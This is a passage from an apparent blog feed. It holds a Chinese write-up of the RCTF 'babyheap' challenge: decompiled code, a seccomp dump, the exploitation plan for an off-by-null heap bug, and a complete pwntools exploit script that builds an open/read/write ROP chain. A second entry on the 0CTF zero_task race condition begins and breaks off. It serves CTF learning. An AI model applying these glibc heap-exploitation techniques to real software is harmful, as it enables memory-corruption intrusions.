    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>周末做了下RCTF，还是太菜了，babyheap这道题，本来以为就是基本的NULL byte poison，然后house of orange，后来发现seccomp禁用了execve，然后就不会了，赛后看了大佬的wp才知道是unsorted bin attack修改global_max_fast,这个在ctf wiki上出现过，但是一直没有试过…戳到我的盲区了…..</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h4><p>和常规pwn题一样，保护全开，菜单题目.</p><h5 id="init函数"><a href="#init函数" class="headerlink" title="init函数:"></a>init函数:</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"open failed!"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">read(fd, &amp;ptrs, <span class="number">8</span>uLL);</span><br><span class="line">close(fd);</span><br><span class="line">ptrs = (void *)((unsigned int)ptrs &amp; <span class="number">0</span>xFFFF0000);</span><br><span class="line">mallopt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( mmap(ptrs, <span class="number">0</span>x1000uLL, <span class="number">3</span>, <span class="number">34</span>, -<span class="number">1</span>, <span class="number">0</span>LL) != ptrs )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"mmap error!"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1</span>LL, <span class="number">0</span>LL, <span class="number">0</span>LL, <span class="number">0</span>LL) )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"Could not start seccomp:"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2</span>LL, &amp;filterprog) == -<span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"Could not start seccomp:"</span>);</span><br><span class="line">  <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mmap了一块随机的区域用来存放申请的堆块的信息。<br>mallopt(1, 0)禁用了fastbin，其实是将global_max_fast 这个全局变量修改为0，开始不清楚禁用fastbin的机制，就没有往修改global_max_fast上想.<br>prctl函数禁用了一些系统调用:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000004</span>  <span class="keyword">A</span> = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15 0x01</span> <span class="number">0</span>x00 <span class="number">0</span>xc000003e  if (<span class="keyword">A</span> == ARCH_X86_64) goto <span class="number">0003</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  <span class="keyword">A</span> = sys_number</span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x01 <span class="number">0x00000029</span>  if (<span class="keyword">A</span> != socket) goto <span class="number">0006</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x01 <span class="number">0</span>x0000003b  if (<span class="keyword">A</span> != execve) goto <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>其中禁用了execve，那就拿不到shell了，只能通过open,read,write来读取flag.</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数:"></a>add函数:</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LODWORD(idx) = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( *((_QWORD *)ptrs + <span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx) &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)idx &lt;= <span class="number">15</span> )</span><br><span class="line">  LODWORD(idx) = idx + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)idx == <span class="number">16</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You can't"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Size: "</span>, idx);</span><br><span class="line">size = get_int();</span><br><span class="line"><span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0x1000</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid size :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)ptrs + <span class="number">4</span> * idxa + <span class="number">2</span>) = size;</span><br><span class="line">  v0 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)ptrs + <span class="number">16</span> * idxa);</span><br><span class="line">  *v0 = <span class="built_in">calloc</span>(size, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Add success :)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最多只能申请16个chunk，申请的chunk的地址，和输入的size信息存放在mmap分配的区域中，输入的size不能超过0x1000</p><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数:"></a>edit函数:</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">LODWORD(idx) = get_int();</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)idx &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)idx &lt;= <span class="number">15</span> &amp;&amp; *((_QWORD *)ptrs + <span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)idx) )<span class="comment">// offbyNULL </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>, idx);</span><br><span class="line">  v1 = read_n(*((<span class="keyword">void</span> **)ptrs + <span class="number">2</span> * v0), *((_DWORD *)ptrs + <span class="number">4</span> * v0 + <span class="number">2</span>));</span><br><span class="line">  *(_BYTE *)(*((_QWORD *)ptrs + <span class="number">2</span> * v0) + v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Edit success :)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在offbyone漏洞，溢出字节为NULL.很显然，unsorted bin的poison_null_byte来造成堆块重叠.<br>show和delete函数就是常规的打印操作和free操作，且free操作没有UAF，将指针和size都清零了.</p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路:"></a>利用思路:</h4><p>由于不能得到shell，只能向栈上写rop，open，read，write读取flag.</p><ol><li>首先利用<strong>poison_null_byte</strong>造成堆块重叠</li><li>利用堆块重叠，leak出libc.</li><li>利用堆块重叠造成 <strong>unsorted bin attack修改global_max_fast</strong>为&amp;main_arena+88,这样就可以使用fastbin，造成fastbin attack.</li><li>fastbin attack在<strong>mian_arena中写入合法的chunk_size </strong>(利用手法0ctf 2018 babyheap)</li><li>然后将chunk分配到main_arena，修改top chunk的地址到__free_hook附近处，一般离的很远…</li><li>申请到__free_hook附近的chunk，由于离的比较远，大约0x1000左右…所以需要先写入一个合法的size，然后再利用fastbin attack申请到这个chunk.</li><li>利用申请到的chunk，<strong>修改__free_hook为printf的地址</strong>，然后利用格式化串漏洞leak出栈地址和程序基址，再利用格式化串漏洞向栈中写入合法的chunk_size(栈中有saved rbp，可以用%lln直接写入)</li><li>然后将chunk分配到栈中，再在栈中写入ptr的地址（ptr中保存的有mmap分配的地址），再利用格式化串(%s)leak出mmap分配的地址.</li><li>得到mmap的地址后，利用fastbin attack，将chunk分配到mmap分配的区域，这样指针和size都可控了，将指针修改为栈的返回地址，然后利用edit写入ROP即可。</li></ol><p>ROP可以是用mprotect将栈可执行，然后写入shellcode，也可以直接open，read，write，由于libc中有xchg eax，edi ； ret ，直接open，read，write即可。</p><p>注意unsorted bin attack的时候，需要把unsorted bin中剩下的chunk一下申请完，就不会报错，会直接将整块chunk返回给你:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">//</span></span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);  <span class="comment">//unsorted bin attack，将目标修改为 &amp;main_arena+88</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">if</span> (<span class="built_in">size</span> == nb) <span class="comment">//恰好相等，直接返回</span></span><br><span class="line">   &#123;</span><br><span class="line">  set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="built_in">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h4 id="完整利用脚本"><a href="#完整利用脚本" class="headerlink" title="完整利用脚本:"></a>完整利用脚本:</h4><p>环境是ubuntu16.04 ,glibc2.23<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">local = 1</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,'-h']</span><br><span class="line">if local :</span><br><span class="line">    a=process(<span class="string">"./babyheap"</span>)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="section">else:</span></span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line">    libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./babyheap"</span>)</span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(a,'''</span><br><span class="line">b *(0x555555554000+0x000000000001103)</span><br><span class="line">b *(0x555555554000+0x000000000001327)</span><br><span class="line">b *(0x555555554000+0x000000000001240)</span><br><span class="line">               ''')</span><br><span class="line"><span class="comment">#add,delete,edit</span></span><br><span class="line">def menu(index):</span><br><span class="line">    a.recvuntil(<span class="string">"Choice: \n"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    a.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">def edit(index,content):</span><br><span class="line">    menu(2)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line">    a.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    a.send(content)</span><br><span class="line">def delete(index):</span><br><span class="line">    menu(3)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line">def show(index):</span><br><span class="line">    menu(4)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x18)<span class="comment">#0    0</span></span><br><span class="line">add(0x910)<span class="comment">#1   0x20</span></span><br><span class="line">add(0x100)<span class="comment">#2   0x1c0</span></span><br><span class="line">add(0x10)<span class="comment">#3</span></span><br><span class="line">edit(1,'A'*0x8f0+p64(0x900)+p64(0x81))<span class="comment">#fake size</span></span><br><span class="line">delete(1)</span><br><span class="line">edit(0,'\x00'*0x18)<span class="comment">#offbyone</span></span><br><span class="line">add(0x10)<span class="comment">#1    0x20</span></span><br><span class="line">add(0x10)<span class="comment">#4     0x40</span></span><br><span class="line">add(0x8d8-0x20)<span class="comment">#5   0x60    </span></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">add(0x10)<span class="comment">#1   0x20</span></span><br><span class="line">show(4)</span><br><span class="line"></span><br><span class="line">libc_base = u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols[<span class="string">"__malloc_hook"</span>]-0x10</span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">fake_chunk=malloc_hook-0x23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20)<span class="comment">#2</span></span><br><span class="line">edit(2,'A'*0x10+p64(0)+p64(0x8d8-0x20+8+1))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">global_max_fast=libc_base+0x3c67f8</span><br><span class="line"></span><br><span class="line">fake_file=p64(0)+p64(0x4e1)                                 </span><br><span class="line">fake_file+='A'*8+p64(global_max_fast-0x10)    <span class="comment">#unsortedbin attack </span></span><br><span class="line"></span><br><span class="line">edit(5,fake_file)</span><br><span class="line">add(0x4d0) <span class="comment">#6    0x70</span></span><br><span class="line">edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21)+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x71)+p64(0x81))</span><br><span class="line">add(0x68) <span class="comment"># 6</span></span><br><span class="line">edit(5,p64(0)+p64(0x81))</span><br><span class="line">delete(6)</span><br><span class="line">main_arena=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]+0x10</span><br><span class="line">fake_chunk=libc_base+0x3c4b50-0x8</span><br><span class="line">success(<span class="string">"fake_chunk_addr ==&gt; 0x%x"</span>%fake_chunk)</span><br><span class="line">edit(5,p64(0)+p64(0x81)+p64(fake_chunk))</span><br><span class="line">add(0x78)<span class="comment">#6</span></span><br><span class="line">add(0x78)<span class="comment">#7 get fake_chunk</span></span><br><span class="line"></span><br><span class="line">fake_top_chunk=0x3c5710+libc_base</span><br><span class="line">payload='\x00'*0x20+p64(fake_top_chunk)+'\x00'*(0x10-8)</span><br><span class="line">payload+=p64(libc_base+0x00007ffff7dd1b78-0x7ffff7a0d000)*2</span><br><span class="line">edit(7,payload)  <span class="comment">#恢复unsorted bin</span></span><br><span class="line"></span><br><span class="line">edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x71)+p64(0))<span class="comment">#恢复fastbin</span></span><br><span class="line">add(0x68)<span class="comment">#6 </span></span><br><span class="line"><span class="comment">#0x1098</span></span><br><span class="line">add(0x100)<span class="comment">#8</span></span><br><span class="line">edit(8,p64(0)+p64(0x880))</span><br><span class="line">edit(5,p64(0)+p64(0x881)+'A'*0x870+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">edit(5,p64(0)+p64(0x881)+p64(0x7ffff7dd2720-0x7ffff7a0d000+libc_base))</span><br><span class="line">add(0x870)<span class="comment">#6</span></span><br><span class="line">add(0x870)<span class="comment">#9 get fake_chunk</span></span><br><span class="line">edit(9,'A'*0x860+p64(0)+p64(0x880))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(5,p64(0)+p64(0x881)+'A'*0x870+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x881)+p64(0x7ffff7dd2f90-0x7ffff7a0d000+libc_base))</span><br><span class="line">add(0x870)<span class="comment">#6</span></span><br><span class="line">add(0x870)<span class="comment">#10 get fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr=libc_base+libc.symbols[<span class="string">"printf"</span>]</span><br><span class="line">success(<span class="string">"printf_addr ==&gt; 0x%x"</span>%printf_addr)</span><br><span class="line">edit(10,'\x00'*0x808+p64(printf_addr))  <span class="comment">#修改__free_hook ==&gt; printf</span></span><br><span class="line"><span class="comment">#b *0x7ffff7a915e5</span></span><br><span class="line">edit(0,'%9$p%8$p')  <span class="comment"># 0xd74 </span></span><br><span class="line">delete(0)</span><br><span class="line">text_base=int(a.recv(14),16)-0xd74</span><br><span class="line">success(<span class="string">"text_base ==&gt; 0x%x"</span>%text_base)</span><br><span class="line">stack_addr=int(a.recv(14),16)</span><br><span class="line">success(<span class="string">"stack_addr ==&gt; 0x%x"</span>%stack_addr)</span><br><span class="line">fake_stack_chunk=stack_addr+0x40-0x8</span><br><span class="line">success(<span class="string">"fake_stack_chunk ==&gt; 0x%x"</span>%fake_stack_chunk)</span><br><span class="line"></span><br><span class="line">edit(1,'%48c%18$lln')</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">ptr_addr=0x202110+text_base</span><br><span class="line">success(<span class="string">"ptr_addr ==&gt; 0x%x"</span>%ptr_addr)</span><br><span class="line">edit(10,'\x00'*0x808+p64(0)+'\x00'*0x48+p64(0x12345678))<span class="comment">#free_hook ==&gt; 0</span></span><br><span class="line">edit(5,p64(0)+p64(0x31)+'A'*0x20+p64(0)+p64(0x21))</span><br><span class="line">delete(6)</span><br><span class="line">edit(5,p64(0)+p64(0x30)+p64(fake_stack_chunk))</span><br><span class="line">add(0x28)<span class="comment">#0</span></span><br><span class="line">add(0x28)<span class="comment">#1 get fake chunk</span></span><br><span class="line">edit(1,p64(ptr_addr+2))</span><br><span class="line"></span><br><span class="line">edit(10,'\x00'*0x808+p64(printf_addr))<span class="comment"># free_hook ==&gt; printf</span></span><br><span class="line">edit(2,<span class="string">"%23$sA"</span>)</span><br><span class="line">delete(2)</span><br><span class="line">mmap_addr='\x00\x00'+a.recvuntil(<span class="string">"A"</span>,drop=True)</span><br><span class="line">mmap_addr=u64(mmap_addr.ljust(8,'\x00'))</span><br><span class="line">success(<span class="string">"mmap_addr ==&gt; 0x%x"</span>%mmap_addr)</span><br><span class="line"></span><br><span class="line">edit(10,'\x00'*0x808+p64(0))<span class="comment"># __free_hook ==&gt; 0</span></span><br><span class="line">edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21))</span><br><span class="line">delete(0)</span><br><span class="line">edit(5,p64(0)+p64(0x71)+p64(mmap_addr+0x70))</span><br><span class="line">add(0x68)<span class="comment">#0</span></span><br><span class="line">add(0x68)<span class="comment">#2 get mmap , 修改8 ， 9 ， 10 。。。。</span></span><br><span class="line">dest_addr=stack_addr+0x28</span><br><span class="line"></span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">pop_rdi_ret=text_base+0x1433</span><br><span class="line">pop_rsi_r15_ret=text_base+0x1431</span><br><span class="line">read_got=text_base+0x201F98</span><br><span class="line">push_rax_ret=libc_base+0x00000000000348fd</span><br><span class="line">pop_rsi_ret=libc_base+0x202e8</span><br><span class="line">pop_rdx_ret=libc_base+0x1b92</span><br><span class="line">pop_rdi_pop_rbp_ret=libc_base+0x20256</span><br><span class="line">xchg_eax_edi_ret=libc_base+0x00000000000b0aa4</span><br><span class="line"><span class="comment">#ROP chain</span></span><br><span class="line">payload=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(dest_addr+18*8+0xd)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(0x4)</span><br><span class="line">payload+=p64(open_addr)</span><br><span class="line">payload+=p64(xchg_eax_edi_ret)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+='A'*0xd</span><br><span class="line">payload+=p64(dest_addr+20*8)</span><br><span class="line">payload+=p64(pop_rdx_ret)</span><br><span class="line">payload+=p64(0x10)</span><br><span class="line">payload+=p64(read_addr)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(1)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(dest_addr+20*8)</span><br><span class="line">payload+=p64(pop_rdx_ret)</span><br><span class="line">payload+=p64(0x10)</span><br><span class="line">payload+=p64(write_addr)</span><br><span class="line">payload+=<span class="string">"/mnt/hgfs/Desktop/rctf/babyheap/flag\x00"</span></span><br><span class="line">edit(2,p64(dest_addr)+p64(0x200)) </span><br><span class="line">edit(8,payload)<span class="comment">#在返回地址处填入ROP</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h4&gt;&lt;p&gt;周末做了下RCTF，还是太菜了，babyheap这道题，本来以为就是基本的NULL byte poison，然后house of ora
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>zero_task条件竞争利用</title>
    <link href="http://yoursite.com/2019/05/20/zero-task%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/05/20/zero-task条件竞争利用/</id>
    <published>2019-05-20T14:25:01.000Z</published>
    <updated>2019-05-22T03:14:43.065Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>跟着别人的wp复现了0CTF 2019中所谓的最简单的一道pwn题（真tm难，大佬们太强了），顺面学习了一波条件竞争的利用.</p><blockquote><p>参考了 <a href="https://www.anquanke.com/post/id/175401#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175401#h3-4</a></p></blockquote><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h4><p>从来没做过一次add函数出来这么多chunk的题目，程序本身也看了半天才理清楚。功能是就是加解密。还有目标libc版本是2.27</p><h5 id="add-task"><a href="#add-task" class="headerlink" title="add_task:"></a>add_task:</h5><p>add函数会从上到下依次创建4个chunk:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存放信息的 task_info结构体 （<span class="number">0x80</span> <span class="keyword">byte</span>）</span><br><span class="line">EVP_CIPHER_CTX_new 产生的 EVP_CIPHER_CTX对象  （<span class="number">0xb0</span> <span class="keyword">byte</span>）</span><br><span class="line">EVP_CIPHER_CTX对象 创建的chunk  （<span class="number">0x110</span> <span class="keyword">byte</span>）</span><br><span class="line">存放data的chunk （根据用户输入的<span 